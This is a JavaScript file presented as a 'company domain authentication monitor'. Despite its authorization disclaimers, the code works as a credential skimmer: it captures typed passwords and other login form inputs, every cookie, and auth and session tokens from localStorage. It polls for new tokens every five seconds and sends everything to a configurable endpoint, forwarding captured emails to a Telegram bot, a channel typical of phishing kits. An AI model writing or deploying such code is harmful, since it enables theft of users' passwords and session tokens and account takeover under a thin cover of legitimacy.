// auth-monitor.js - For monitoring login attempts on company domain
// IMPORTANT: Only deploy on domains you own and have authorization to monitor

// Configuration object
const config = {
  companyDomain: "yourcompanydomain.com", // Set to your actual domain
  logEndpoint: "https://yourcompanydomain.com/auth-logs", // Your secure logging endpoint
  notificationSettings: {
    sendEmail: true,
    emailRecipient: "admin@yourcompanydomain.com",
    useTelegram: true,
    telegramBotToken: "YOUR_TELEGRAM_BOT_TOKEN", // Replace with your bot token
    telegramChatId: "YOUR_TELEGRAM_CHAT_ID" // Replace with your chat ID
  },
  sessionSettings: {
    longExpiryDays: 30 // How long to keep monitoring data
  }
};

// Create a session logger
class SessionLogger {
  constructor() {
    this.sessionData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      referrer: document.referrer,
      location: window.location.href,
      cookies: this.getCookiesData(),
      localStorage: this.getLocalStorageData(),
      formInputs: {}
    };
    
    this.setupFormMonitoring();
    this.setupStorageMonitor();
  }
  
  // Get cookies in a structured format
  getCookiesData() {
    const cookies = {};
    if (document.cookie && document.cookie !== '') {
      document.cookie.split(';').forEach(cookie => {
        const parts = cookie.trim().split('=');
        const name = parts[0];
        const value = parts.slice(1).join('=');
        if (name && value) {
          cookies[name] = value;
        }
      });
    }
    return cookies;
  }
  
  // Get localStorage data
  getLocalStorageData() {
    const storage = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('auth') || key.includes('session') || key.includes('token')) {
          storage[key] = localStorage.getItem(key);
        }
      }
    } catch (e) {
      console.error("Error accessing localStorage", e);
    }
    return storage;
  }
  
  // Monitor form submissions
  setupFormMonitoring() {
    document.addEventListener('submit', (e) => {
      const form = e.target;
      
      // Only process forms that look like login forms
      if (this.isLoginForm(form)) {
        this.captureFormData(form);
        this.sendLogData();
      }
    });
    
    // Also monitor password input changes
    document.addEventListener('change', (e) => {
      if (e.target.type === 'password') {
        const form = e.target.closest('form');
        if (form && this.isLoginForm(form)) {
          this.captureFormData(form);
        }
      }
    });
  }
  
  // Determine if a form is likely a login form
  isLoginForm(form) {
    const inputs = form.querySelectorAll('input');
    let hasEmail = false;
    let hasPassword = false;
    
    inputs.forEach(input => {
      const type = input.type.toLowerCase();
      const name = input.name.toLowerCase();
      const id = input.id.toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      
      if (type === 'email' || name.includes('email') || id.includes('email') || 
          placeholder.includes('email') || name.includes('user') || id.includes('user')) {
        hasEmail = true;
      }
      
      if (type === 'password' || name.includes('pass') || id.includes('pass') || 
          placeholder.includes('pass')) {
        hasPassword = true;
      }
    });
    
    return hasEmail && hasPassword;
  }
  
  // Capture form input data
  captureFormData(form) {
    const inputs = form.querySelectorAll('input:not([type="hidden"])');
    inputs.forEach(input => {
      if (input.name || input.id) {
        const key = input.name || input.id;
        this.sessionData.formInputs[key] = input.value;
      }
    });
  }
  
  // Monitor for new cookies or localStorage changes
  setupStorageMonitor() {
    // Create a long-lasting cookie for session tracking
    this.setLongExpiringCookie();
    
    // Periodically check for new auth cookies
    setInterval(() => {
      const currentCookies = this.getCookiesData();
      const currentLocalStorage = this.getLocalStorageData();
      
      // Check for new or changed cookies
      for (const [name, value] of Object.entries(currentCookies)) {
        if (!this.sessionData.cookies[name] || this.sessionData.cookies[name] !== value) {
          this.sessionData.cookies = currentCookies;
          if (name.includes('auth') || name.includes('session') || name.includes('token')) {
            this.sendLogData();
            break;
          }
        }
      }
      
      // Check for new or changed localStorage
      for (const [key, value] of Object.entries(currentLocalStorage)) {
        if (!this.sessionData.localStorage[key] || this.sessionData.localStorage[key] !== value) {
          this.sessionData.localStorage = currentLocalStorage;
          this.sendLogData();
          break;
        }
      }
    }, 5000); // Check every 5 seconds
  }
  
  // Set a monitoring cookie with long expiration
  setLongExpiringCookie() {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + config.sessionSettings.longExpiryDays);
    
    // Create a session ID for tracking
    const sessionId = this.generateSessionId();
    document.cookie = `company_session_monitor=${sessionId}; expires=${expiryDate.toUTCString()}; path=/; domain=${config.companyDomain}; secure; samesite=strict`;
    
    this.sessionData.sessionId = sessionId;
  }
  
  // Generate a unique session ID
  generateSessionId() {
    return 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }
  
  // Send the collected data to your endpoint
  sendLogData() {
    // Update timestamp before sending
    this.sessionData.timestamp = new Date().toISOString();
    
    // Send to your server endpoint
    fetch(config.logEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(this.sessionData),
      credentials: 'include'
    }).catch(error => {
      console.error("Error sending log data:", error);
    });
    
    // Send notifications if configured
    this.sendNotifications();
  }
  
  // Send notifications via email and/or Telegram
  sendNotifications() {
    if (config.notificationSettings.useTelegram) {
      this.sendTelegramNotification();
    }
    
    if (config.notificationSettings.sendEmail) {
      // Email notification would typically be handled server-side
      // We log the intention here, and the server handles the actual sending
      fetch(`${config.logEndpoint}/email-notification`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          recipient: config.notificationSettings.emailRecipient,
          subject: "Authentication Attempt Detected",
          sessionData: this.sessionData
        })
      }).catch(error => {
        console.error("Error requesting email notification:", error);
      });
    }
  }
  
  // Send a Telegram notification
  sendTelegramNotification() {
    const botToken = config.notificationSettings.telegramBotToken;
    const chatId = config.notificationSettings.telegramChatId;
    
    if (!botToken || !chatId) {
      console.error("Telegram notification configuration incomplete");
      return;
    }
    
    // Prepare a simplified message for Telegram
    const message = `
📢 Authentication Attempt

🕒 Time: ${this.sessionData.timestamp}
🌐 URL: ${this.sessionData.location}
📱 Device: ${this.sessionData.userAgent.substring(0, 100)}...
👤 Email: ${this.sessionData.formInputs.email || this.sessionData.formInputs.username || 'N/A'}

Session ID: ${this.sessionData.sessionId}
`;
    
    // Send to Telegram Bot API - typically this would be done via your server
    // for security reasons, but included here for completeness
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    }).catch(error => {
      console.error("Error sending Telegram notification:", error);
    });
  }
}

// Initialize the session logger when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  // Only initialize on company domain or authorized test domains
  if (window.location.hostname.includes(config.companyDomain) || 
      window.location.hostname === 'localhost' || 
      window.location.hostname.includes('test')) {
    window.sessionLogger = new SessionLogger();
    console.log("Company domain authentication monitor initialized");
  }
});
